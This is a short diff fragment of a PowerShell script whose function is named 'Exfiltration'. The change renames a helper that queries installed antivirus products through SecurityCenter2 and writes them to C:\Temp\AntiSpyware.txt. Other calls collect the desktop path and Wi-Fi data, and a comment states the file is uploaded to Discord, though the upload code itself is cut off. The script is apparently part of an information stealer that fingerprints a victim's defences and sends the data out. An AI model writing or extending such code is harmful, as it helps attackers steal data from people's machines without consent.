@@ -52,8 +52,8 @@ function Exfiltration {
     # Get desktop path
     $desktop = [Environment]::GetFolderPath("Desktop")
 
-    # Call version-av function
-    version-av
+    # Call AntiSpywareInfo function
+    AntiSpywareInfo
 
     # Call Wifi function
     Wifi
@@ -84,7 +84,7 @@ function Exfiltration {
     
 }
 
-function version-av {
+function AntiSpywareInfo {
     Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8
 
     # Upload AntiSpyware.txt to Discord
